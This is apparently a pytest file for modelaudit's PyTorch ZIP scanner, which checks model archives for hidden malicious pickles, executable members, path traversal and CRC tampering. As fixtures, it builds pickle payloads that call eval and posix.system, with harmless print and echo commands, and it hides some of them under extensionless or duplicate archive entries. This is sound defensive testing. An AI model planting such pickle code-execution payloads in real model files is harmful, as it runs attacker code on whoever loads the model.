import json
import pickle
import struct
import time
import warnings
import zipfile
from pathlib import Path
from typing import IO

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.detectors.suspicious_symbols import CVE_COMBINED_PATTERNS
from modelaudit.scanner_results import INCONCLUSIVE_SCAN_OUTCOME, Check, ScanResult
from modelaudit.scanners.archive_dispatch import NESTED_SCAN_CALLBACK_CONFIG_KEY
from modelaudit.scanners.base import CheckStatus, IssueSeverity
from modelaudit.scanners.pytorch_zip_scanner import PyTorchZipScanner
from tests.helpers import create_mock_pytorch_zip

_ASSETS_DIR = Path(__file__).resolve().parents[1] / "assets"


def _corrupt_zip_member_crc(zip_path: Path, member_name: str) -> None:
    """Patch ZIP headers so one member reports an incorrect CRC without changing data."""
    with zipfile.ZipFile(zip_path, "r") as zip_file:
        info = zip_file.getinfo(member_name)
        central_directory_offset = zip_file.start_dir

    archive_bytes = bytearray(zip_path.read_bytes())
    local_crc_offset = info.header_offset + 14
    original_crc = struct.unpack_from("<I", archive_bytes, local_crc_offset)[0]
    corrupt_crc = (original_crc ^ 0xFFFFFFFF) & 0xFFFFFFFF
    struct.pack_into("<I", archive_bytes, local_crc_offset, corrupt_crc)

    cursor = central_directory_offset
    while cursor < len(archive_bytes) and archive_bytes[cursor : cursor + 4] == b"PK\x01\x02":
        filename_len, extra_len, comment_len = struct.unpack_from("<HHH", archive_bytes, cursor + 28)
        filename_start = cursor + 46
        filename_end = filename_start + filename_len
        if archive_bytes[filename_start:filename_end] == member_name.encode("utf-8"):
            struct.pack_into("<I", archive_bytes, cursor + 16, corrupt_crc)
            zip_path.write_bytes(archive_bytes)
            return
        cursor = filename_end + extra_len + comment_len

    raise AssertionError(f"Unable to locate central directory entry for {member_name}")


def _malicious_eval_pickle_payload() -> bytes:
    class MaliciousClass:
        def __reduce__(self) -> tuple[object, tuple[str]]:
            return (eval, ("print('pwned')",))

    return pickle.dumps({"payload": MaliciousClass()})


def _malicious_proto0_system_payload() -> bytes:
    return b"cposix\nsystem\n(S'echo hidden'\ntR."


def _pytorch_storage_persistent_id_payload(key: str | bytes) -> bytes:
    if isinstance(key, str):
        key_bytes = key.encode("utf-8")
        key_opcode = b"\x8c" + bytes([len(key_bytes)]) + key_bytes + b"\x94"
    else:
        key_bytes = key
        key_opcode = b"C" + bytes([len(key_bytes)]) + key_bytes + b"\x94"

    assert len(key_bytes) < 256
    return (
        b"\x80\x04("
        b"\x8c\x07storage\x94"
        b"\x8c\x05torch\x94"
        b"\x8c\x0cFloatStorage\x94\x93" + key_opcode + b"\x8c\x03cpu\x94K\x01tQ."
    )


def _write_zip_with_duplicate_data_pkl(zip_path: Path, first_payload: bytes, second_payload: bytes) -> None:
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", UserWarning)
        with zipfile.ZipFile(zip_path, "w") as zipf:
            zipf.writestr("version", "3")
            zipf.writestr("data.pkl", first_payload)
            zipf.writestr("data.pkl", second_payload)


def _assert_standard_cve_details(details: dict[str, object], cve_id: str, detected_version: str) -> None:
    cve_info = CVE_COMBINED_PATTERNS[cve_id]
    assert details["cve_id"] == cve_id
    assert details["detected_pytorch_version"] == detected_version
    assert "installed_pytorch_version" in details
    assert details["description"] == cve_info["description"]
    assert details["remediation"] == cve_info["remediation"]
    assert details["cvss"] == cve_info["cvss"]
    assert details["cwe"] == cve_info["cwe"]
    assert details["vulnerability_description"] == cve_info["description"]
    assert details["recommendation"] == cve_info["remediation"]


def test_pytorch_zip_scanner_can_handle(tmp_path):
    """Test the can_handle method of PyTorchZipScanner."""
    # Test with actual PyTorch file
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")
    assert PyTorchZipScanner.can_handle(str(model_path)) is True

    # Test with non-existent file
    assert PyTorchZipScanner.can_handle("nonexistent.pt") is False

    # Test with wrong extension
    test_file = tmp_path / "model.h5"
    test_file.write_bytes(b"not a pytorch file")
    assert PyTorchZipScanner.can_handle(str(test_file)) is False


@pytest.mark.parametrize("suffix", [".ckpt", ".pkl", ".bin"])
def test_pytorch_zip_scanner_can_handle_requires_pytorch_zip_markers_for_ambiguous_suffixes(
    suffix: str,
    tmp_path: Path,
) -> None:
    """Generic ZIP files with ambiguous PyTorch suffixes should not route to PyTorchZipScanner."""
    model_path = tmp_path / f"generic{suffix}"
    with zipfile.ZipFile(model_path, "w") as archive:
        archive.writestr("payload.txt", "not a pytorch archive")

    assert PyTorchZipScanner.can_handle(str(model_path)) is False


def test_pytorch_zip_scanner_safe_model(tmp_path):
    """Test scanning a safe PyTorch ZIP model."""
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    assert result.success is True
    assert result.bytes_scanned > 0

    # Check for issues - a safe model might still have some informational issues
    error_issues = [issue for issue in result.issues if issue.severity == IssueSeverity.CRITICAL]
    assert len(error_issues) == 0


def test_pytorch_zip_scanner_malicious_model(tmp_path):
    """Test scanning a malicious PyTorch ZIP model."""
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", malicious=True)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    # The scanner should detect the eval function in the pickle
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any("eval" in issue.message.lower() for issue in result.issues)


def test_pytorch_zip_discovery_rejects_ascii_opcode_plain_text_members(tmp_path: Path) -> None:
    """Plain text members that start with protocol-0 opcode bytes should not be routed as pickles."""
    model_path = tmp_path / "ascii_text_members.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data", b"cat is a category label, not a GLOBAL opcode stream")
        zip_file.writestr("archive/constants", b"I keep integer-looking notes in this checkpoint manifest")
        zip_file.writestr("archive/notes", b"(plain prose inside parentheses)")

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert result.metadata["pickle_files"] == []
    assert not any(
        check.name == "Pickle Format Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_pytorch_zip_discovery_accepts_extensionless_proto0_pickle(tmp_path: Path) -> None:
    """Extensionless PyTorch pickle members should still be discovered through structural probing."""
    model_path = tmp_path / "extensionless_proto0.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data", pickle.dumps({"weights": [1, 2, 3]}, protocol=0))

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert result.metadata["pickle_files"] == ["archive/data"]
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_pytorch_zip_discovery_scans_only_real_extensionless_pickle_near_text(tmp_path: Path) -> None:
    """A real extensionless pickle should still be scanned when sibling text starts with pickle-ish bytes."""
    model_path = tmp_path / "mixed_extensionless_members.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data", b"cbuiltins\neval\n(S'print(1)'\ntR.")
        zip_file.writestr("archive/constants", b"compiled constants are documented here")

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.metadata["pickle_files"] == ["archive/data"]
    assert any(issue.severity == IssueSeverity.CRITICAL and "eval" in issue.message.lower() for issue in result.issues)


def test_pytorch_zip_discovery_finds_hidden_extensionless_pickle_with_data_pkl(tmp_path: Path) -> None:
    """A normal data.pkl must not short-circuit hidden member pickle discovery."""
    model_path = tmp_path / "hidden_extensionless_pickle.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/payload", _malicious_proto0_system_payload())

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.metadata["pickle_files"] == ["archive/data.pkl", "archive/payload"]
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("pickle_filename") == "archive/payload"
        for issue in result.issues
    )


def test_pytorch_zip_discovery_finds_hidden_storage_pickle_with_data_pkl(tmp_path: Path) -> None:
    """Bounded storage-prefix sniffing should catch pickles hidden under data/<n>."""
    model_path = tmp_path / "hidden_storage_pickle.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/data/0", _malicious_proto0_system_payload())

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.metadata["pickle_files"] == ["archive/data.pkl", "archive/data/0"]
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("pickle_filename") == "archive/data/0"
        for issue in result.issues
    )


def test_pytorch_zip_discovery_ignores_benign_pickleish_text_with_data_pkl(tmp_path: Path) -> None:
    """Text that starts with protocol-0-looking bytes should not become a hidden pickle false positive."""
    model_path = tmp_path / "benign_pickleish_text.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/notes", b"cat is a category label, not a GLOBAL opcode stream")
        zip_file.writestr("archive/data/0", b"\x00" * 1024)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert result.metadata["pickle_files"] == ["archive/data.pkl"]
    assert not any(
        issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        and issue.details.get("pickle_filename") in {"archive/notes", "archive/data/0"}
        for issue in result.issues
    )


def test_pytorch_zip_discovery_aggregates_probe_failures_into_single_check(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Multiple probe failures must collapse into one aggregated INFO check."""
    model_path = tmp_path / "unreadable_hidden_pickles.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        for index in range(5):
            zip_file.writestr(f"archive/blob{index}", b"\xff" * 128)

    original = PyTorchZipScanner._read_member_prefix

    def fail_probe(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
        entry: zipfile.ZipInfo,
        length: int,
        *,
        phase: str,
        result: ScanResult,
    ) -> bytes:
        name = self._get_zip_member_name(entry)
        if phase == "pickle_discovery" and "blob" in name:
            raise NotImplementedError(f"unsupported compression: {name}")
        return original(self, zip_file, entry, length, phase=phase, result=result)

    monkeypatch.setattr(PyTorchZipScanner, "_read_member_prefix", fail_probe)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    reasons = result.metadata["scan_outcome_reasons"]
    assert reasons.count("pytorch_zip_pickle_discovery_incomplete") == 1

    probe_checks = [check for check in result.checks if check.name == "Pickle Discovery"]
    assert len(probe_checks) == 1
    details = probe_checks[0].details
    assert details["failed_count"] == 5
    assert sorted(details["zip_entries"]) == [f"archive/blob{index}" for index in range(5)]
    assert all(entry["exception_type"] == "NotImplementedError" for entry in details["entries"])


def test_pytorch_zip_scanner_detects_case_insensitive_native_library_members(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "native_libs.pt")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/data/MALICIOUS.SO", b"\x7fELF")
        zip_file.writestr("archive/data/libpayload.SO.6", b"\x7fELF")
        zip_file.writestr("archive/data/plugin.Dylib", b"\xfe\xed\xfa\xcf")

    result = PyTorchZipScanner().scan(str(model_path))

    executable_issues = [
        issue for issue in result.issues if issue.message and "Executable file found in PyTorch model" in issue.message
    ]
    executable_files = {issue.details.get("file") for issue in executable_issues}
    assert {
        "archive/data/MALICIOUS.SO",
        "archive/data/libpayload.SO.6",
        "archive/data/plugin.Dylib",
    }.issubset(executable_files)
    assert all(issue.severity == IssueSeverity.CRITICAL for issue in executable_issues)


def test_pytorch_zip_scanner_native_library_near_match_extension_stays_clean(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "near_match.pt")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/data/plugin.sology", b"not a shared object")
        zip_file.writestr("archive/data/plugin.so.version", b"not a versioned shared object")
        zip_file.writestr("archive/data/plugin.so.6cache", b"not a versioned shared object")
        zip_file.writestr("archive/data/plugin.dllcache", b"not a dll")

    result = PyTorchZipScanner().scan(str(model_path))

    assert not any(
        issue.message and "Executable file found in PyTorch model" in issue.message for issue in result.issues
    )


def test_pytorch_zip_scanner_relaxes_crc_for_pickle_scan(tmp_path: Path) -> None:
    """CRC-mismatched pickle entries should still be scanned with an explicit warning."""
    model_path = create_mock_pytorch_zip(tmp_path / "crc_mismatch.pt", malicious=True)
    _corrupt_zip_member_crc(model_path, "data.pkl")

    result = PyTorchZipScanner().scan(str(model_path))

    crc_checks = [check for check in result.checks if check.name == "PyTorch ZIP CRC Handling"]

    assert result.success is True
    assert any(issue.severity == IssueSeverity.CRITICAL and "eval" in issue.message.lower() for issue in result.issues)
    assert len(crc_checks) == 1
    assert crc_checks[0].status == CheckStatus.FAILED
    assert crc_checks[0].severity == IssueSeverity.WARNING
    assert crc_checks[0].details["zip_entry"] == "data.pkl"
    assert crc_checks[0].details["scan_phases"] == result.metadata["relaxed_crc_members"]["data.pkl"]
    assert "pickle_scan" in crc_checks[0].details["scan_phases"]
    assert "pickle_scan" in result.metadata["relaxed_crc_members"]["data.pkl"]


def test_pytorch_zip_scanner_normal_archive_skips_relaxed_crc_signal(tmp_path: Path) -> None:
    """Valid archives should stay on the strict member-read path."""
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert "relaxed_crc_members" not in result.metadata
    assert not [check for check in result.checks if check.name == "PyTorch ZIP CRC Handling"]


def test_pytorch_zip_scanner_path_traversal_named_pickle_keeps_archive_rule(tmp_path: Path) -> None:
    model_path = tmp_path / "traversal.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("version", "3")
        zip_file.writestr("../../pickle_payload.bin", b"not a pickle")

    result = PyTorchZipScanner().scan(str(model_path))

    traversal_checks = [
        check
        for check in result.checks
        if check.name == "Path Traversal Protection" and check.status == CheckStatus.FAILED
    ]
    assert len(traversal_checks) == 1
    assert traversal_checks[0].severity == IssueSeverity.CRITICAL
    assert traversal_checks[0].rule_code == "S405"
    assert not [check for check in result.checks if check.rule_code == "S213"]


def test_pytorch_zip_scanner_executable_named_pickle_keeps_executable_rule(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "executable.pt")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/data/pickle_payload.exe", b"not executed")

    result = PyTorchZipScanner().scan(str(model_path))

    executable_checks = [
        check
        for check in result.checks
        if check.name == "Executable File Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(executable_checks) == 1
    assert executable_checks[0].severity == IssueSeverity.CRITICAL
    assert executable_checks[0].rule_code == "S501"
    assert not [check for check in result.checks if check.rule_code == "S213"]


def test_pytorch_zip_scanner_scans_shadowed_duplicate_data_pkl(tmp_path: Path) -> None:
    """A benign last-write duplicate must not hide a malicious earlier data.pkl entry."""
    model_path = tmp_path / "duplicate_data_pkl.pt"
    safe_payload = pickle.dumps({"weights": [1, 2, 3]})
    _write_zip_with_duplicate_data_pkl(model_path, _malicious_eval_pickle_payload(), safe_payload)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    duplicate_collision_checks = [check for check in result.checks if check.name == "Duplicate ZIP Entry Collision"]
    critical_issues = [issue for issue in result.issues if issue.severity == IssueSeverity.CRITICAL]

    assert any("eval" in issue.message.lower() for issue in critical_issues)
    assert any(check.status == CheckStatus.FAILED for check in duplicate_collision_checks)
    assert result.metadata["pickle_files"] == ["data.pkl", "data.pkl"]


def test_pytorch_zip_scanner_allows_identical_duplicate_data_pkl(tmp_path: Path) -> None:
    """Identical duplicate data.pkl entries should both be scanned without collision noise."""
    model_path = tmp_path / "identical_duplicate_data_pkl.pt"
    safe_payload = pickle.dumps({"weights": [1, 2, 3]})
    _write_zip_with_duplicate_data_pkl(model_path, safe_payload, safe_payload)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    duplicate_collision_checks = [check for check in result.checks if check.name == "Duplicate ZIP Entry Collision"]

    assert result.success is True
    assert not [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}]
    assert len(duplicate_collision_checks) == 1
    assert duplicate_collision_checks[0].status == CheckStatus.PASSED
    assert result.metadata["pickle_files"] == ["data.pkl", "data.pkl"]


def test_pytorch_zip_scanner_conflicting_duplicate_data_pkl_is_info_only(tmp_path: Path) -> None:
    """Conflicting duplicate data.pkl entries should stay non-failing when every copy is benign."""
    model_path = tmp_path / "conflicting_duplicate_data_pkl.pt"
    first_payload = pickle.dumps({"weights": [1, 2, 3]})
    second_payload = pickle.dumps({"weights": [4, 5, 6]})
    _write_zip_with_duplicate_data_pkl(model_path, first_payload, second_payload)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    duplicate_collision_checks = [check for check in result.checks if check.name == "Duplicate ZIP Entry Collision"]

    assert result.success is True
    assert not [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}]
    assert len(duplicate_collision_checks) == 1
    assert duplicate_collision_checks[0].status == CheckStatus.FAILED
    assert duplicate_collision_checks[0].severity == IssueSeverity.INFO
    assert result.metadata["pickle_files"] == ["data.pkl", "data.pkl"]


def test_pytorch_zip_scanner_invalid_zip(tmp_path: Path) -> None:
    """Invalid ZIP structure is incomplete coverage, not a detected hazard."""
    # Create an invalid ZIP file
    invalid_path = tmp_path / "invalid.pt"
    invalid_path.write_bytes(b"This is not a valid ZIP file")

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(invalid_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_format_unrecognized" in result.metadata["scan_outcome_reasons"]
    assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)
    assert any(
        "invalid" in issue.message.lower() or "corrupt" in issue.message.lower() or "error" in issue.message.lower()
        for issue in result.issues
    )


def test_pytorch_zip_scanner_missing_data_pkl(tmp_path):
    """Test scanning a PyTorch ZIP file without data.pkl."""
    # Create a ZIP file without data.pkl
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("model.json", '{"name": "test_model"}')

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should have a warning about missing data.pkl
    assert any("data.pkl" in issue.message for issue in result.issues)


def test_pytorch_zip_scanner_with_blacklist(tmp_path):
    """Test PyTorch ZIP scanner with custom blacklist patterns."""
    # Create a ZIP file with content that matches our blacklist
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")

        # Create data with a string that will match our blacklist
        data = {"weights": [1, 2, 3], "custom_function": "suspicious_function"}
        pickled_data = pickle.dumps(data)
        zipf.writestr("data.pkl", pickled_data)

    # Create scanner with custom blacklist
    scanner = PyTorchZipScanner(config={"blacklist_patterns": ["suspicious_function"]})
    result = scanner.scan(str(zip_path))

    # Should detect our blacklisted pattern
    blacklist_issues = [issue for issue in result.issues if "suspicious_function" in issue.message.lower()]
    assert len(blacklist_issues) > 0


def test_pytorch_pickle_file_unsupported(tmp_path):
    """Raw pickle files with .pt extension should be unsupported."""
    from tests.assets.generators.generate_evil_pickle import EvilClass

    file_path = tmp_path / "raw_pickle.pt"
    with file_path.open("wb") as f:
        pickle.dump(EvilClass(), f)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(file_path))

    assert result.success is False
    assert any("zip" in issue.message.lower() or "pytorch" in issue.message.lower() for issue in result.issues)


def test_pytorch_zip_scanner_closes_bytesio(tmp_path, monkeypatch):
    """Ensure BytesIO objects are properly closed after scanning."""
    import io

    closed = {}

    class TrackedBytesIO(io.BytesIO):
        def close(self) -> None:
            closed["closed"] = True
            super().close()

    monkeypatch.setattr(io, "BytesIO", TrackedBytesIO)

    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")
    scanner = PyTorchZipScanner()
    scanner.scan(str(model_path))

    assert closed.get("closed") is True


def test_pytorch_zip_initialize_scan_does_not_read_archive_members(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Regression test for stale duplicate scan logic in _initialize_scan()."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/0", b"\x00" * 1024)

    archive_reads: list[str] = []

    def fail_read(
        self: zipfile.ZipFile,
        name: str | zipfile.ZipInfo,
        pwd: bytes | None = None,
    ) -> bytes:
        archive_reads.append(name.filename if isinstance(name, zipfile.ZipInfo) else str(name))
        raise AssertionError("_initialize_scan() should not read archive member payloads")

    def fail_open(
        self: zipfile.ZipFile,
        name: str | zipfile.ZipInfo,
        mode: str = "r",
        pwd: bytes | None = None,
        *,
        force_zip64: bool = False,
    ) -> IO[bytes]:
        archive_reads.append(name.filename if isinstance(name, zipfile.ZipInfo) else str(name))
        raise AssertionError("_initialize_scan() should not open archive member payloads")

    monkeypatch.setattr(zipfile.ZipFile, "read", fail_read)
    monkeypatch.setattr(zipfile.ZipFile, "open", fail_open)

    scanner = PyTorchZipScanner()
    result = scanner._initialize_scan(str(zip_path))

    assert result.success is True
    assert archive_reads == []
    assert "pickle_files" not in result.metadata


def test_pytorch_zip_scan_does_not_route_numeric_tensor_data_files_as_pickles(tmp_path: Path) -> None:
    """Numeric tensor payloads should be prefix-probed but not routed as pickles."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/0", b"\x00" * 1024)
        zipf.writestr("archive/data/1", b"\x00" * 1024)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    assert result.success is True
    assert result.metadata["pickle_files"] == ["archive/data.pkl"]
    assert not any(
        issue.details.get("pickle_filename") in {"archive/data/0", "archive/data/1"} for issue in result.issues
    )


def test_pytorch_zip_scanner_handles_zip_metadata_oserror(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Non-BadZipFile metadata failures should fail closed without inventing a finding."""
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")

    def fail_namelist(self: zipfile.ZipFile) -> list[str]:
        raise OSError("zip metadata unavailable")

    monkeypatch.setattr(zipfile.ZipFile, "namelist", fail_namelist)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_scan_failed" in result.metadata["scan_outcome_reasons"]
    assert any("zip metadata unavailable" in check.message for check in result.checks)
    assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)


def test_pytorch_zip_corrupt_format_is_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "corrupt.pt"
    model_path.write_bytes(b"PK\x03\x04truncated")

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)


def test_pytorch_zip_preserves_path_traversal_when_late_scan_fails(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "traversal_then_failure.pt")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("../escape.py", b"value = 1\n")

    def fail_discovery(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
        safe_entries: list[zipfile.ZipInfo],
        result: ScanResult,
    ) -> list[zipfile.ZipInfo]:
        raise OSError("late metadata failure")

    monkeypatch.setattr(PyTorchZipScanner, "_discover_pickle_files", fail_discovery)

    direct_result = PyTorchZipScanner().scan(str(model_path))
    assert direct_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_scan_failed" in direct_result.metadata["scan_outcome_reasons"]
    assert any(issue.rule_code == "S405" and issue.severity == IssueSeverity.CRITICAL for issue in direct_result.issues)

    aggregate_result = scan_model_directory_or_file(str(model_path), cache_enabled=False)
    metadata = aggregate_result.file_metadata[str(model_path)]
    assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_scan_failed" in metadata["scan_outcome_reasons"]
    assert determine_exit_code(aggregate_result) == 1
    assert any(issue.rule_code == "S405" for issue in aggregate_result.issues)


def test_pytorch_zip_incomplete_scan_without_findings_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "incomplete.pt")
    cache_dir = tmp_path / "cache"

    def fail_discovery(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
        safe_entries: list[zipfile.ZipInfo],
        result: ScanResult,
    ) -> list[zipfile.ZipInfo]:
        raise OSError("late metadata failure")

    monkeypatch.setattr(PyTorchZipScanner, "_discover_pickle_files", fail_discovery)

    reset_cache_manager()
    try:
        first_result = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second_result = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        for aggregate_result in (first_result, second_result):
            metadata = aggregate_result.file_metadata[str(model_path)]
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert "pytorch_zip_scan_failed" in metadata["scan_outcome_reasons"]
            assert determine_exit_code(aggregate_result) == 2
            assert not any(
                issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in aggregate_result.issues
            )
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_pytorch_zip_timeout_marks_inconclusive(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "timeout.pt")

    result = PyTorchZipScanner(config={"timeout": -1}).scan(str(model_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_scan_timeout" in result.metadata["scan_outcome_reasons"]
    timeout_checks = [check for check in result.checks if check.name == "Scan Timeout"]
    assert len(timeout_checks) == 1
    assert timeout_checks[0].severity == IssueSeverity.INFO


def test_pytorch_zip_jit_scan_size_limit_marks_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "large_jit_member.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/code/debug/source.py", b"print('hello')\n")

    result = PyTorchZipScanner(config={"max_jit_scan_member_bytes": 4}).scan(str(model_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_jit_member_size_limit" in result.metadata["scan_outcome_reasons"]
    size_checks = [check for check in result.checks if check.name == "JIT/Network Scan Size Limit"]
    # Aggregation: many oversize members should surface as a single summary
    # check with a `details["zip_entries"]` list, not one INFO per member.
    assert len(size_checks) == 1
    assert size_checks[0].severity == IssueSeverity.INFO
    assert "archive/code/debug/source.py" in size_checks[0].details["zip_entries"]
    assert "archive/byteorder" in size_checks[0].details["zip_entries"]
    assert size_checks[0].details["skipped_count"] == len(size_checks[0].details["zip_entries"])
    assert size_checks[0].details["analysis_incomplete"] is True
    assert size_checks[0].details["max_scan_bytes"] == 4


def test_pytorch_zip_jit_scan_read_failure_marks_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "unreadable_jit_member.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/code/debug/source.py", b"print('hello')\n")

    original_read_member_bytes = PyTorchZipScanner._read_member_bytes

    def fail_jit_member_read(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
